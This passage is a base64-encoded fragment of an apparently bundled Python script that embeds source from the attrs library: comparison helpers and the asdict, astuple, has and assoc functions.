cbiAgICBkZWYgX19pbml0X18oc2VsZiwgdmFsdWUpOlxuICAgICAgICAiIiJcbiAgICAgICAgSW5pdGlhbGl6ZSBvYmplY3Qgd2l0aCAqdmFsdWUqLlxuICAgICAgICAiIiJcbiAgICAgICAgc2VsZi52YWx1ZSA9IHZhbHVlXG5cbiAgICByZXR1cm4gX19pbml0X19cblxuXG5kZWYgX21ha2Vfb3BlcmF0b3IobmFtZSwgZnVuYyk6XG4gICAgIiIiXG4gICAgQ3JlYXRlIG9wZXJhdG9yIG1ldGhvZC5cbiAgICAiIiJcblxuICAgIGRlZiBtZXRob2Qoc2VsZiwgb3RoZXIpOlxuICAgICAgICBpZiBub3Qgc2VsZi5faXNfY29tcGFyYWJsZV90byhvdGhlcik6XG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcblxuICAgICAgICByZXN1bHQgPSBmdW5jKHNlbGYudmFsdWUsIG90aGVyLnZhbHVlKVxuICAgICAgICBpZiByZXN1bHQgaXMgTm90SW1wbGVtZW50ZWQ6XG4gICAgICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcblxuICAgICAgICByZXR1cm4gcmVzdWx0XG5cbiAgICBtZXRob2QuX19uYW1lX18gPSAiX18lc19fIiAlIChuYW1lLClcbiAgICBtZXRob2QuX19kb2NfXyA9ICJSZXR1cm4gYSAlcyBiLiAgQ29tcHV0ZWQgYnkgYXR0cnMuIiAlIChcbiAgICAgICAgX29wZXJhdGlvbl9uYW1lc1tuYW1lXSxcbiAgICApXG5cbiAgICByZXR1cm4gbWV0aG9kXG5cblxuZGVmIF9pc19jb21wYXJhYmxlX3RvKHNlbGYsIG90aGVyKTpcbiAgICAiIiJcbiAgICBDaGVjayB3aGV0aGVyIGBvdGhlcmAgaXMgY29tcGFyYWJsZSB0byBgc2VsZmAuXG4gICAgIiIiXG4gICAgZm9yIGZ1bmMgaW4gc2VsZi5fcmVxdWlyZW1lbnRzOlxuICAgICAgICBpZiBub3QgZnVuYyhzZWxmLCBvdGhlcik6XG4gICAgICAgICAgICByZXR1cm4gRmFsc2VcbiAgICByZXR1cm4gVHJ1ZVxuXG5cbmRlZiBfY2hlY2tfc2FtZV90eXBlKHNlbGYsIG90aGVyKTpcbiAgICAiIiJcbiAgICBSZXR1cm4gVHJ1ZSBpZiAqc2VsZiogYW5kICpvdGhlciogYXJlIG9mIHRoZSBzYW1lIHR5cGUsIEZhbHNlIG90aGVyd2lzZS5cbiAgICAiIiJcbiAgICByZXR1cm4gb3RoZXIudmFsdWUuX19jbGFzc19fIGlzIHNlbGYudmFsdWUuX19jbGFzc19fXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9fZnVuY3MucHknLCBiJyMgU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVFxuXG5mcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFic29sdXRlX2ltcG9ydCwgZGl2aXNpb24sIHByaW50X2Z1bmN0aW9uXG5cbmltcG9ydCBjb3B5XG5cbmZyb20gLl9jb21wYXQgaW1wb3J0IGl0ZXJpdGVtc1xuZnJvbSAuX21ha2UgaW1wb3J0IE5PVEhJTkcsIF9vYmpfc2V0YXR0ciwgZmllbGRzXG5mcm9tIC5leGNlcHRpb25zIGltcG9ydCBBdHRyc0F0dHJpYnV0ZU5vdEZvdW5kRXJyb3JcblxuXG5kZWYgYXNkaWN0KFxuICAgIGluc3QsXG4gICAgcmVjdXJzZT1UcnVlLFxuICAgIGZpbHRlcj1Ob25lLFxuICAgIGRpY3RfZmFjdG9yeT1kaWN0LFxuICAgIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzPUZhbHNlLFxuICAgIHZhbHVlX3NlcmlhbGl6ZXI9Tm9uZSxcbik6XG4gICAgIiIiXG4gICAgUmV0dXJuIHRoZSBgYGF0dHJzYGAgYXR0cmlidXRlIHZhbHVlcyBvZiAqaW5zdCogYXMgYSBkaWN0LlxuXG4gICAgT3B0aW9uYWxseSByZWN1cnNlIGludG8gb3RoZXIgYGBhdHRyc2BgLWRlY29yYXRlZCBjbGFzc2VzLlxuXG4gICAgOnBhcmFtIGluc3Q6IEluc3RhbmNlIG9mIGFuIGBgYXR0cnNgYC1kZWNvcmF0ZWQgY2xhc3MuXG4gICAgOnBhcmFtIGJvb2wgcmVjdXJzZTogUmVjdXJzZSBpbnRvIGNsYXNzZXMgdGhhdCBhcmUgYWxzb1xuICAgICAgICBgYGF0dHJzYGAtZGVjb3JhdGVkLlxuICAgIDpwYXJhbSBjYWxsYWJsZSBmaWx0ZXI6IEEgY2FsbGFibGUgd2hvc2UgcmV0dXJuIGNvZGUgZGV0ZXJtaW5lcyB3aGV0aGVyIGFuXG4gICAgICAgIGF0dHJpYnV0ZSBvciBlbGVtZW50IGlzIGluY2x1ZGVkIChgYFRydWVgYCkgb3IgZHJvcHBlZCAoYGBGYWxzZWBgKS4gIElzXG4gICAgICAgIGNhbGxlZCB3aXRoIHRoZSBgYXR0cnMuQXR0cmlidXRlYCBhcyB0aGUgZmlyc3QgYXJndW1lbnQgYW5kIHRoZVxuICAgICAgICB2YWx1ZSBhcyB0aGUgc2Vjb25kIGFyZ3VtZW50LlxuICAgIDpwYXJhbSBjYWxsYWJsZSBkaWN0X2ZhY3Rvcnk6IEEgY2FsbGFibGUgdG8gcHJvZHVjZSBkaWN0aW9uYXJpZXMgZnJvbS4gIEZvclxuICAgICAgICBleGFtcGxlLCB0byBwcm9kdWNlIG9yZGVyZWQgZGljdGlvbmFyaWVzIGluc3RlYWQgb2Ygbm9ybWFsIFB5dGhvblxuICAgICAgICBkaWN0aW9uYXJpZXMsIHBhc3MgaW4gYGBjb2xsZWN0aW9ucy5PcmRlcmVkRGljdGBgLlxuICAgIDpwYXJhbSBib29sIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzOiBEbyBub3QgY29udmVydCB0byBgYGxpc3RgYCB3aGVuXG4gICAgICAgIGVuY291bnRlcmluZyBhbiBhdHRyaWJ1dGUgd2hvc2UgdHlwZSBpcyBgYHR1cGxlYGAgb3IgYGBzZXRgYC4gIE9ubHlcbiAgICAgICAgbWVhbmluZ2Z1bCBpZiBgYHJlY3Vyc2VgYCBpcyBgYFRydWVgYC5cbiAgICA6cGFyYW0gT3B0aW9uYWxbY2FsbGFibGVdIHZhbHVlX3NlcmlhbGl6ZXI6IEEgaG9vayB0aGF0IGlzIGNhbGxlZCBmb3IgZXZlcnlcbiAgICAgICAgYXR0cmlidXRlIG9yIGRpY3Qga2V5L3ZhbHVlLiAgSXQgcmVjZWl2ZXMgdGhlIGN1cnJlbnQgaW5zdGFuY2UsIGZpZWxkXG4gICAgICAgIGFuZCB2YWx1ZSBhbmQgbXVzdCByZXR1cm4gdGhlICh1cGRhdGVkKSB2YWx1ZS4gIFRoZSBob29rIGlzIHJ1biAqYWZ0ZXIqXG4gICAgICAgIHRoZSBvcHRpb25hbCAqZmlsdGVyKiBoYXMgYmVlbiBhcHBsaWVkLlxuXG4gICAgOnJ0eXBlOiByZXR1cm4gdHlwZSBvZiAqZGljdF9mYWN0b3J5KlxuXG4gICAgOnJhaXNlIGF0dHIuZXhjZXB0aW9ucy5Ob3RBbkF0dHJzQ2xhc3NFcnJvcjogSWYgKmNscyogaXMgbm90IGFuIGBgYXR0cnNgYFxuICAgICAgICBjbGFzcy5cblxuICAgIC4uICB2ZXJzaW9uYWRkZWQ6OiAxNi4wLjAgKmRpY3RfZmFjdG9yeSpcbiAgICAuLiAgdmVyc2lvbmFkZGVkOjogMTYuMS4wICpyZXRhaW5fY29sbGVjdGlvbl90eXBlcypcbiAgICAuLiAgdmVyc2lvbmFkZGVkOjogMjAuMy4wICp2YWx1ZV9zZXJpYWxpemVyKlxuICAgIC4uICB2ZXJzaW9uYWRkZWQ6OiAyMS4zLjAgSWYgYSBkaWN0IGhhcyBhIGNvbGxlY3Rpb24gZm9yIGEga2V5LCBpdCBpc1xuICAgICAgICBzZXJpYWxpemVkIGFzIGEgdHVwbGUuXG4gICAgIiIiXG4gICAgYXR0cnMgPSBmaWVsZHMoaW5zdC5fX2NsYXNzX18pXG4gICAgcnYgPSBkaWN0X2ZhY3RvcnkoKVxuICAgIGZvciBhIGluIGF0dHJzOlxuICAgICAgICB2ID0gZ2V0YXR0cihpbnN0LCBhLm5hbWUpXG4gICAgICAgIGlmIGZpbHRlciBpcyBub3QgTm9uZSBhbmQgbm90IGZpbHRlcihhLCB2KTpcbiAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgaWYgdmFsdWVfc2VyaWFsaXplciBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHYgPSB2YWx1ZV9zZXJpYWxpemVyKGluc3QsIGEsIHYpXG5cbiAgICAgICAgaWYgcmVjdXJzZSBpcyBUcnVlOlxuICAgICAgICAgICAgaWYgaGFzKHYuX19jbGFzc19fKTpcbiAgICAgICAgICAgICAgICBydlthLm5hbWVdID0gYXNkaWN0KFxuICAgICAgICAgICAgICAgICAgICB2LFxuICAgICAgICAgICAgICAgICAgICByZWN1cnNlPVRydWUsXG4gICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgIGRpY3RfZmFjdG9yeT1kaWN0X2ZhY3RvcnksXG4gICAgICAgICAgICAgICAgICAgIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzPXJldGFpbl9jb2xsZWN0aW9uX3R5cGVzLFxuICAgICAgICAgICAgICAgICAgICB2YWx1ZV9zZXJpYWxpemVyPXZhbHVlX3NlcmlhbGl6ZXIsXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgZWxpZiBpc2luc3RhbmNlKHYsICh0dXBsZSwgbGlzdCwgc2V0LCBmcm96ZW5zZXQpKTpcbiAgICAgICAgICAgICAgICBjZiA9IHYuX19jbGFzc19fIGlmIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzIGlzIFRydWUgZWxzZSBsaXN0XG4gICAgICAgICAgICAgICAgcnZbYS5uYW1lXSA9IGNmKFxuICAgICAgICAgICAgICAgICAgICBbXG4gICAgICAgICAgICAgICAgICAgICAgICBfYXNkaWN0X2FueXRoaW5nKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfa2V5PUZhbHNlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGljdF9mYWN0b3J5PWRpY3RfZmFjdG9yeSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXRhaW5fY29sbGVjdGlvbl90eXBlcz1yZXRhaW5fY29sbGVjdGlvbl90eXBlcyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZV9zZXJpYWxpemVyPXZhbHVlX3NlcmlhbGl6ZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiB2XG4gICAgICAgICAgICAgICAgICAgIF1cbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBlbGlmIGlzaW5zdGFuY2UodiwgZGljdCk6XG4gICAgICAgICAgICAgICAgZGYgPSBkaWN0X2ZhY3RvcnlcbiAgICAgICAgICAgICAgICBydlthLm5hbWVdID0gZGYoXG4gICAgICAgICAgICAgICAgICAgIChcbiAgICAgICAgICAgICAgICAgICAgICAgIF9hc2RpY3RfYW55dGhpbmcoXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAga2ssXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfa2V5PVRydWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsdGVyPWZpbHRlcixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaWN0X2ZhY3Rvcnk9ZGYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9cmV0YWluX2NvbGxlY3Rpb25fdHlwZXMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWVfc2VyaWFsaXplcj12YWx1ZV9zZXJpYWxpemVyLFxuICAgICAgICAgICAgICAgICAgICAgICAgKSxcbiAgICAgICAgICAgICAgICAgICAgICAgIF9hc2RpY3RfYW55dGhpbmcoXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdnYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfa2V5PUZhbHNlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGljdF9mYWN0b3J5PWRmLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzPXJldGFpbl9jb2xsZWN0aW9uX3R5cGVzLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlX3NlcmlhbGl6ZXI9dmFsdWVfc2VyaWFsaXplcixcbiAgICAgICAgICAgICAgICAgICAgICAgICksXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgZm9yIGtrLCB2diBpbiBpdGVyaXRlbXModilcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIHJ2W2EubmFtZV0gPSB2XG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBydlthLm5hbWVdID0gdlxuICAgIHJldHVybiBydlxuXG5cbmRlZiBfYXNkaWN0X2FueXRoaW5nKFxuICAgIHZhbCxcbiAgICBpc19rZXksXG4gICAgZmlsdGVyLFxuICAgIGRpY3RfZmFjdG9yeSxcbiAgICByZXRhaW5fY29sbGVjdGlvbl90eXBlcyxcbiAgICB2YWx1ZV9zZXJpYWxpemVyLFxuKTpcbiAgICAiIiJcbiAgICBgYGFzZGljdGBgIG9ubHkgd29ya3Mgb24gYXR0cnMgaW5zdGFuY2VzLCB0aGlzIHdvcmtzIG9uIGFueXRoaW5nLlxuICAgICIiIlxuICAgIGlmIGdldGF0dHIodmFsLl9fY2xhc3NfXywgIl9fYXR0cnNfYXR0cnNfXyIsIE5vbmUpIGlzIG5vdCBOb25lOlxuICAgICAgICAjIEF0dHJzIGNsYXNzLlxuICAgICAgICBydiA9IGFzZGljdChcbiAgICAgICAgICAgIHZhbCxcbiAgICAgICAgICAgIHJlY3Vyc2U9VHJ1ZSxcbiAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICBkaWN0X2ZhY3Rvcnk9ZGljdF9mYWN0b3J5LFxuICAgICAgICAgICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9cmV0YWluX2NvbGxlY3Rpb25fdHlwZXMsXG4gICAgICAgICAgICB2YWx1ZV9zZXJpYWxpemVyPXZhbHVlX3NlcmlhbGl6ZXIsXG4gICAgICAgIClcbiAgICBlbGlmIGlzaW5zdGFuY2UodmFsLCAodHVwbGUsIGxpc3QsIHNldCwgZnJvemVuc2V0KSk6XG4gICAgICAgIGlmIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzIGlzIFRydWU6XG4gICAgICAgICAgICBjZiA9IHZhbC5fX2NsYXNzX19cbiAgICAgICAgZWxpZiBpc19rZXk6XG4gICAgICAgICAgICBjZiA9IHR1cGxlXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBjZiA9IGxpc3RcblxuICAgICAgICBydiA9IGNmKFxuICAgICAgICAgICAgW1xuICAgICAgICAgICAgICAgIF9hc2RpY3RfYW55dGhpbmcoXG4gICAgICAgICAgICAgICAgICAgIGksXG4gICAgICAgICAgICAgICAgICAgIGlzX2tleT1GYWxzZSxcbiAgICAgICAgICAgICAgICAgICAgZmlsdGVyPWZpbHRlcixcbiAgICAgICAgICAgICAgICAgICAgZGljdF9mYWN0b3J5PWRpY3RfZmFjdG9yeSxcbiAgICAgICAgICAgICAgICAgICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9cmV0YWluX2NvbGxlY3Rpb25fdHlwZXMsXG4gICAgICAgICAgICAgICAgICAgIHZhbHVlX3NlcmlhbGl6ZXI9dmFsdWVfc2VyaWFsaXplcixcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgZm9yIGkgaW4gdmFsXG4gICAgICAgICAgICBdXG4gICAgICAgIClcbiAgICBlbGlmIGlzaW5zdGFuY2UodmFsLCBkaWN0KTpcbiAgICAgICAgZGYgPSBkaWN0X2ZhY3RvcnlcbiAgICAgICAgcnYgPSBkZihcbiAgICAgICAgICAgIChcbiAgICAgICAgICAgICAgICBfYXNkaWN0X2FueXRoaW5nKFxuICAgICAgICAgICAgICAgICAgICBrayxcbiAgICAgICAgICAgICAgICAgICAgaXNfa2V5PVRydWUsXG4gICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgIGRpY3RfZmFjdG9yeT1kZixcbiAgICAgICAgICAgICAgICAgICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9cmV0YWluX2NvbGxlY3Rpb25fdHlwZXMsXG4gICAgICAgICAgICAgICAgICAgIHZhbHVlX3NlcmlhbGl6ZXI9dmFsdWVfc2VyaWFsaXplcixcbiAgICAgICAgICAgICAgICApLFxuICAgICAgICAgICAgICAgIF9hc2RpY3RfYW55dGhpbmcoXG4gICAgICAgICAgICAgICAgICAgIHZ2LFxuICAgICAgICAgICAgICAgICAgICBpc19rZXk9RmFsc2UsXG4gICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgIGRpY3RfZmFjdG9yeT1kZixcbiAgICAgICAgICAgICAgICAgICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9cmV0YWluX2NvbGxlY3Rpb25fdHlwZXMsXG4gICAgICAgICAgICAgICAgICAgIHZhbHVlX3NlcmlhbGl6ZXI9dmFsdWVfc2VyaWFsaXplcixcbiAgICAgICAgICAgICAgICApLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgZm9yIGtrLCB2diBpbiBpdGVyaXRlbXModmFsKVxuICAgICAgICApXG4gICAgZWxzZTpcbiAgICAgICAgcnYgPSB2YWxcbiAgICAgICAgaWYgdmFsdWVfc2VyaWFsaXplciBpcyBub3QgTm9uZTpcbiAgICAgICAgICAgIHJ2ID0gdmFsdWVfc2VyaWFsaXplcihOb25lLCBOb25lLCBydilcblxuICAgIHJldHVybiBydlxuXG5cbmRlZiBhc3R1cGxlKFxuICAgIGluc3QsXG4gICAgcmVjdXJzZT1UcnVlLFxuICAgIGZpbHRlcj1Ob25lLFxuICAgIHR1cGxlX2ZhY3Rvcnk9dHVwbGUsXG4gICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9RmFsc2UsXG4pOlxuICAgICIiIlxuICAgIFJldHVybiB0aGUgYGBhdHRyc2BgIGF0dHJpYnV0ZSB2YWx1ZXMgb2YgKmluc3QqIGFzIGEgdHVwbGUuXG5cbiAgICBPcHRpb25hbGx5IHJlY3Vyc2UgaW50byBvdGhlciBgYGF0dHJzYGAtZGVjb3JhdGVkIGNsYXNzZXMuXG5cbiAgICA6cGFyYW0gaW5zdDogSW5zdGFuY2Ugb2YgYW4gYGBhdHRyc2BgLWRlY29yYXRlZCBjbGFzcy5cbiAgICA6cGFyYW0gYm9vbCByZWN1cnNlOiBSZWN1cnNlIGludG8gY2xhc3NlcyB0aGF0IGFyZSBhbHNvXG4gICAgICAgIGBgYXR0cnNgYC1kZWNvcmF0ZWQuXG4gICAgOnBhcmFtIGNhbGxhYmxlIGZpbHRlcjogQSBjYWxsYWJsZSB3aG9zZSByZXR1cm4gY29kZSBkZXRlcm1pbmVzIHdoZXRoZXIgYW5cbiAgICAgICAgYXR0cmlidXRlIG9yIGVsZW1lbnQgaXMgaW5jbHVkZWQgKGBgVHJ1ZWBgKSBvciBkcm9wcGVkIChgYEZhbHNlYGApLiAgSXNcbiAgICAgICAgY2FsbGVkIHdpdGggdGhlIGBhdHRycy5BdHRyaWJ1dGVgIGFzIHRoZSBmaXJzdCBhcmd1bWVudCBhbmQgdGhlXG4gICAgICAgIHZhbHVlIGFzIHRoZSBzZWNvbmQgYXJndW1lbnQuXG4gICAgOnBhcmFtIGNhbGxhYmxlIHR1cGxlX2ZhY3Rvcnk6IEEgY2FsbGFibGUgdG8gcHJvZHVjZSB0dXBsZXMgZnJvbS4gIEZvclxuICAgICAgICBleGFtcGxlLCB0byBwcm9kdWNlIGxpc3RzIGluc3RlYWQgb2YgdHVwbGVzLlxuICAgIDpwYXJhbSBib29sIHJldGFpbl9jb2xsZWN0aW9uX3R5cGVzOiBEbyBub3QgY29udmVydCB0byBgYGxpc3RgYFxuICAgICAgICBvciBgYGRpY3RgYCB3aGVuIGVuY291bnRlcmluZyBhbiBhdHRyaWJ1dGUgd2hpY2ggdHlwZSBpc1xuICAgICAgICBgYHR1cGxlYGAsIGBgZGljdGBgIG9yIGBgc2V0YGAuICBPbmx5IG1lYW5pbmdmdWwgaWYgYGByZWN1cnNlYGAgaXNcbiAgICAgICAgYGBUcnVlYGAuXG5cbiAgICA6cnR5cGU6IHJldHVybiB0eXBlIG9mICp0dXBsZV9mYWN0b3J5KlxuXG4gICAgOnJhaXNlIGF0dHIuZXhjZXB0aW9ucy5Ob3RBbkF0dHJzQ2xhc3NFcnJvcjogSWYgKmNscyogaXMgbm90IGFuIGBgYXR0cnNgYFxuICAgICAgICBjbGFzcy5cblxuICAgIC4uICB2ZXJzaW9uYWRkZWQ6OiAxNi4yLjBcbiAgICAiIiJcbiAgICBhdHRycyA9IGZpZWxkcyhpbnN0Ll9fY2xhc3NfXylcbiAgICBydiA9IFtdXG4gICAgcmV0YWluID0gcmV0YWluX2NvbGxlY3Rpb25fdHlwZXMgICMgVmVyeSBsb25nLiA6L1xuICAgIGZvciBhIGluIGF0dHJzOlxuICAgICAgICB2ID0gZ2V0YXR0cihpbnN0LCBhLm5hbWUpXG4gICAgICAgIGlmIGZpbHRlciBpcyBub3QgTm9uZSBhbmQgbm90IGZpbHRlcihhLCB2KTpcbiAgICAgICAgICAgIGNvbnRpbnVlXG4gICAgICAgIGlmIHJlY3Vyc2UgaXMgVHJ1ZTpcbiAgICAgICAgICAgIGlmIGhhcyh2Ll9fY2xhc3NfXyk6XG4gICAgICAgICAgICAgICAgcnYuYXBwZW5kKFxuICAgICAgICAgICAgICAgICAgICBhc3R1cGxlKFxuICAgICAgICAgICAgICAgICAgICAgICAgdixcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlY3Vyc2U9VHJ1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICB0dXBsZV9mYWN0b3J5PXR1cGxlX2ZhY3RvcnksXG4gICAgICAgICAgICAgICAgICAgICAgICByZXRhaW5fY29sbGVjdGlvbl90eXBlcz1yZXRhaW4sXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBlbGlmIGlzaW5zdGFuY2UodiwgKHR1cGxlLCBsaXN0LCBzZXQsIGZyb3plbnNldCkpOlxuICAgICAgICAgICAgICAgIGNmID0gdi5fX2NsYXNzX18gaWYgcmV0YWluIGlzIFRydWUgZWxzZSBsaXN0XG4gICAgICAgICAgICAgICAgcnYuYXBwZW5kKFxuICAgICAgICAgICAgICAgICAgICBjZihcbiAgICAgICAgICAgICAgICAgICAgICAgIFtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3R1cGxlKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWN1cnNlPVRydWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbHRlcj1maWx0ZXIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR1cGxlX2ZhY3Rvcnk9dHVwbGVfZmFjdG9yeSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0YWluX2NvbGxlY3Rpb25fdHlwZXM9cmV0YWluLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBoYXMoai5fX2NsYXNzX18pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBqXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGogaW4gdlxuICAgICAgICAgICAgICAgICAgICAgICAgXVxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgZWxpZiBpc2luc3RhbmNlKHYsIGRpY3QpOlxuICAgICAgICAgICAgICAgIGRmID0gdi5fX2NsYXNzX18gaWYgcmV0YWluIGlzIFRydWUgZWxzZSBkaWN0XG4gICAgICAgICAgICAgICAgcnYuYXBwZW5kKFxuICAgICAgICAgICAgICAgICAgICBkZihcbiAgICAgICAgICAgICAgICAgICAgICAgIChcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3R1cGxlKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrayxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHVwbGVfZmFjdG9yeT10dXBsZV9mYWN0b3J5LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXRhaW5fY29sbGVjdGlvbl90eXBlcz1yZXRhaW4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhhcyhray5fX2NsYXNzX18pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBrayxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc3R1cGxlKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2dixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHVwbGVfZmFjdG9yeT10dXBsZV9mYWN0b3J5LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXRhaW5fY29sbGVjdGlvbl90eXBlcz1yZXRhaW4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhhcyh2di5fX2NsYXNzX18pXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB2dixcbiAgICAgICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBraywgdnYgaW4gaXRlcml0ZW1zKHYpXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIHJ2LmFwcGVuZCh2KVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgcnYuYXBwZW5kKHYpXG5cbiAgICByZXR1cm4gcnYgaWYgdHVwbGVfZmFjdG9yeSBpcyBsaXN0IGVsc2UgdHVwbGVfZmFjdG9yeShydilcblxuXG5kZWYgaGFzKGNscyk6XG4gICAgIiIiXG4gICAgQ2hlY2sgd2hldGhlciAqY2xzKiBpcyBhIGNsYXNzIHdpdGggYGBhdHRyc2BgIGF0dHJpYnV0ZXMuXG5cbiAgICA6cGFyYW0gdHlwZSBjbHM6IENsYXNzIHRvIGludHJvc3BlY3QuXG4gICAgOnJhaXNlIFR5cGVFcnJvcjogSWYgKmNscyogaXMgbm90IGEgY2xhc3MuXG5cbiAgICA6cnR5cGU6IGJvb2xcbiAgICAiIiJcbiAgICByZXR1cm4gZ2V0YXR0cihjbHMsICJfX2F0dHJzX2F0dHJzX18iLCBOb25lKSBpcyBub3QgTm9uZVxuXG5cbmRlZiBhc3NvYyhpbnN0LCAqKmNoYW5nZXMpOlxuICAgICIiIlxuICAgIENvcHkgKmluc3QqIGFuZCBhcHBseSAqY2hhbmdlcyouXG5cbiAgICA6cGFyYW0gaW5zdDogSW5zdGFuY2Ugb2YgYSBjbGFzcyB3aXRoIGBgYXR0cnNgYCBhdHRyaWJ1dGVzLlxuICAgIDpwYXJhbSBjaGFuZ2VzOiBLZXl3b3JkIGNoYW5nZXMgaW4gdGhlIG5ldyBjb3B5LlxuXG4gICAgOnJldHVybjogQSBjb3B5IG9mIGluc3Qgd2l0aCAqY2hhbmdlcyogaW5jb3Jwb3JhdGVkLlxuXG4gICAgOnJhaXNlIGF0dHIuZXhjZXB0aW9ucy5BdHRyc0F0dHJpYnV0ZU5vdEZvdW5kRXJyb3I6IElmICphdHRyX25hbWUqIGNvdWxkblwndFxuICAgICAgICBiZSBmb3VuZCBvbiAqY2xzKi5cbiAgICA6cmFpc2UgYXR0ci5leGNlcHRpb25zLk5vdEFuQXR0cnNDbGFzc0Vycm9yOiBJZiAqY2xzKiBpcyBub3QgYW4gYGBhdHRyc2BgXG4gICAgICAgIGNsYXNzLlxuXG4gICAgLi4gIGRlcHJlY2F0ZWQ6OiAxNy4xLjBcbiAgICAgICAgVXNlIGBhdHRycy5ldm9sdmVgIGluc3RlYWQgaWYgeW91IGNhbi5cbiAgICAgICAgVGhpcyBmdW5jdGlvbiB3aWxsIG5vdCBiZSByZW1vdmVkIGR1IHRvIHRoZSBzbGlnaHRseSBkaWZmZXJlbnQgYXBwcm9hY2hcbiAgICAgICAgY29tcGFyZWQgdG8gYGF0dHJzLmV2b2x2ZWAuXG4gICAgIiIiXG4gICAgaW1wb3J0IHdhcm5pbmd